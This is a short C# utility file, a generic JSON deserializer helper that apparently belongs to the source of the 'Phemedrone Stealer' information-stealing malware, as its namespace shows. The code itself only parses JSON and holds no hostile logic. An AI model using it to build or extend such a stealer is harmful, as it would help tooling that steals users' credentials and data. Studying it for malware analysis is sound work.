using System.IO;
using System.Runtime.Serialization.Json;
using System.Text;

namespace PhemedroneStealer.Extensions;

public class JsonDeserializer
{
    public static T Deserialize<T>(string json)
    {
        using var stream = new MemoryStream(Encoding.UTF8.GetBytes(json));
        var serializer = new DataContractJsonSerializer(typeof(T));
        return (T)serializer.ReadObject(stream);
    }
}